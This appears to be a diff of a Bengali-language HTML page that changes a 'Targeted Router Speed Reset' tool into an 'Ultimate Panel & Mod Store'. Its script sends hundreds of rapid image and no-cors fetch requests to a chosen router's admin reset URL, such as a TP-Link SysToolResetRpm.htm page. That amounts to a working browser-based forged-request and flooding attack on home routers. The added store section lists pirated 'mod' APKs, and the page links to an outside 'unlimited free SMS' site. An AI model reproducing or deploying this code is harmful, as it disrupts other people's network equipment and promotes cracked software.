@@ -1,24 +1,36 @@
- lang="en">
+html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Targeted Router Speed Reset</title>
+    <title>Ultimate Panel & Mod Store</title>
     <style>
         body { font-family: monospace; margin: 0; background-color: #050505; color: #00ff66; text-align: center; padding: 20px; }
         .container { max-width: 600px; margin: auto; padding: 20px; background: #111; border: 2px solid #00ff66; border-radius: 10px; box-shadow: 0 0 25px rgba(0,255,102,0.3); }
         h2 { color: #00ff66; }
         label { display: block; margin-top: 15px; font-size: 14px; text-align: left; color: #aaa; }
-        select { width: 100%; padding: 10px; margin-top: 5px; background: #222; color: #fff; border: 1px solid #00ff66; border-radius: 5px; font-size: 14px; }
-        .btn { background: #00ff66; color: black; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin-top: 20px; text-transform: uppercase; }
+        select, input[type="text"] { width: 100%; padding: 10px; margin-top: 5px; background: #222; color: #fff; border: 1px solid #00ff66; border-radius: 5px; font-size: 14px; box-sizing: border-box; }
+        .btn { background: #00ff66; color: black; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin-top: 15px; text-transform: uppercase; }
         .btn:hover { background: #00cc52; }
-        #log-box { margin-top: 20px; padding: 12px; border-radius: 5px; text-align: left; font-size: 10px; max-height: 220px; overflow-y: auto; background: #000; border: 1px solid #333; color: #00ff66; }
+        .sms-btn { background: #3b82f6; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin-top: 10px; text-transform: uppercase; box-sizing: border-box; text-decoration: none; display: inline-block; }
+        .sms-btn:hover { background: #2563eb; }
+        #log-box { margin-top: 15px; padding: 10px; border-radius: 5px; text-align: left; font-size: 10px; max-height: 150px; overflow-y: auto; background: #000; border: 1px solid #333; color: #00ff66; }
+        
+        /* মড এপিকে স্টোর সেকশন */
+        .store-section { margin-top: 30px; border-top: 2px dashed #00ff66; padding-top: 20px; text-align: left; }
+        .app-card { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 10px; margin-top: 10px; display: flex; align-items: center; justify-content: space-between; }
+        .app-info { display: flex; align-items: center; gap: 12px; }
+        .app-info img { width: 45px; height: 45px; border-radius: 8px; object-fit: cover; }
+        .app-name { font-size: 14px; font-weight: bold; color: #fff; }
+        .app-desc { font-size: 10px; color: #888; margin-top: 2px; }
+        .download-btn { background: #ff0055; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-size: 11px; font-weight: bold; text-decoration: none; text-transform: uppercase; }
+        .download-btn:hover { background: #e6004c; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>🎯 Targeted Speed Reset</h2>
-    <p>তালিকা থেকে নির্দিষ্ট রাউটার সিলেক্ট করে রিকোয়েস্ট পাঠানোর টুল</p>
-
+    <h2>⚡ Ultimate Panel & Mod Store</h2>
+    
+    <!-- রাউটার টুল সেকশন -->
     <label for="routerSelect">টার্গেট রাউটার বা ওয়াইফাই সিলেক্ট করুন:</label>
     <select id="routerSelect">
         <option value="http://192.168.0.1/userRpm/SysToolResetRpm.htm">TP-Link (192.168.0.1)</option>
@@ -29,42 +41,91 @@
     </select>
 
     <button class="btn" onclick="startTargetedSpeed()">🚀 START TARGETED RESET</button>
+    
+    <!-- সরাসরি নতুন ট্যাবে ওপেন হওয়ার জন্য লিংক বাটন -->
+    <a href="http://myalorhawa.yzz.me/sites/customsms/" target="_blank" class="sms-btn">📩 আনলিমিটেড মেসেজ ফ্রি</a>
+    
+    <div id="log-box">[READY] সমস্ত সিস্টেম প্রস্তুত রয়েছে...</div>
 
-    <div id="log-box">[READY] টার্গেট সিলেক্ট করে স্টার্ট বাটনে চাপুন...</div>
+    <!-- মড এপিকে সার্চ ও স্টোর সেকশন -->
+    <div class="store-section">
+        <h3 style="color: #ff0055; margin-top: 0; text-align: center;">🔥 Mod APK Store & Search</h3>
+        <input type="text" id="appSearch" placeholder="অ্যাপের নাম দিয়ে সার্চ করুন..." onkeyup="searchApps()">
+
+        <div id="appList">
+            <!-- অ্যাপের লিস্ট ডাইনামিকালি লোড হবে -->
+        </div>
+    </div>
 </div>
 
 <script>
+// রাউটার রিসেট স্পিড ফাংশন
 function startTargetedSpeed() {
     let logBox = document.getElementById('log-box');
     let selectedUrl = document.getElementById('routerSelect').value;
+    logBox.innerHTML = `[!] টার্গেটে রিকোয়েস্ট পাঠানো হচ্ছে: ${selectedUrl}<br>`;
     
-    logBox.innerHTML = `[!] সিলেক্টকৃত টার্গেটে রিকোয়েস্ট পাঠানো শুরু হচ্ছে: <br>${selectedUrl}<br><br>`;
-
     let count = 0;
-
-    // প্রতি ৫ মিলিসেকেন্ডে সিলেক্ট করা টার্গেটে রিকোয়েস্ট পাঠানো (প্রতি সেকেন্ডে ২০০টি)
     let speedInterval = setInterval(() => {
         try {
             let img = new Image();
             img.src = selectedUrl + "?v=" + Math.random();
-
             fetch(selectedUrl, { mode: 'no-cors', cache: 'no-store' }).catch(() => {});
-
             count++;
-            logBox.innerHTML += `[SENT #${count}] -> ${selectedUrl}<br>`;
+            logBox.innerHTML += `[SENT #${count}]<br>`;
             logBox.scrollTop = logBox.scrollHeight;
         } catch (e) {}
 
-        // ১০০০ রিকোয়েস্ট হওয়ার পর থেমে যাবে
-        if (count >= 1000) {
+        if (count >= 500) {
             clearInterval(speedInterval);
-            logBox.innerHTML += `<br><span style="color: #00ff66; font-weight: bold;">[COMPLETED] সিলেক্টকৃত টার্গেটে ১০০০টি হাই-স্পিড রিকোয়েস্ট পাঠানো সম্পন্ন হয়েছে!</span>`;
-            logBox.scrollTop = logBox.scrollHeight;
+            logBox.innerHTML += `<br><span style="color: #00ff66;">[COMPLETED] রিকোয়েস্ট পাঠানো শেষ!</span>`;
         }
     }, 5);
 }
+
+// মড এপিকে ডাটাবেজ
+let appsData = [
+    { name: "Minecraft Mod", desc: "Unlocked All Skins / Immortality", img: "https://via.placeholder.com/45/ff0055/fff?text=MC", link: "#" },
+    { name: "Spotify Premium Mod", desc: "Unlocked Lifetime Premium", img: "https://via.placeholder.com/45/1db954/fff?text=Sp", link: "#" },
+    { name: "Kinemaster Pro Mod", desc: "No Watermark / All Unlocked", img: "https://via.placeholder.com/45/ff9900/fff?text=KM", link: "#" },
+    { name: "Subway Surfers Mod", desc: "Unlimited Coins / Keys", img: "https://via.placeholder.com/45/3b82f6/fff?text=SS", link: "#" },
+    { name: "PicsArt Photo Editor Mod", desc: "Gold Unlocked / No Ads", img: "https://via.placeholder.com/45/9333ea/fff?text=PA", link: "#" }
+];
+
+function displayApps(data) {
+    let listContainer = document.getElementById('appList');
+    listContainer.innerHTML = "";
+    
+    if(data.length === 0) {
+        listContainer.innerHTML = `<p style="text-align: center; color: #777; font-size: 12px; margin-top: 15px;">কোনো অ্যাপ পাওয়া যায়নি!</p>`;
+        return;
+    }
+
+    data.forEach(app => {
+        listContainer.innerHTML += `
+            <div class="app-card">
+                <div class="app-info">
+                    <img src="${app.img}" alt="App">
+                    <div>
+                        <div class="app-name">${app.name}</div>
+                        <div class="app-desc">${app.desc}</div>
+                    </div>
+                </div>
+                <a href="${app.link}" class="download-btn" onclick="alert('Downloading ${app.name} Mod APK...')">Download</a>
+            </div>
+        `;
+    });
+}
+
+function searchApps() {
+    let query = document.getElementById('appSearch').value.toLowerCase();
+    let filtered = appsData.filter(app => app.name.toLowerCase().includes(query));
+    displayApps(filtered);
+}
+
+// পেজ লোড হওয়ার সাথে সাথে ডিফল্ট অ্যাপ লিস্ট দেখাবে
+displayApps(appsData);
 </script>
 
 </body>
-                                                                                       </html>
-                                                                                       
+</html>
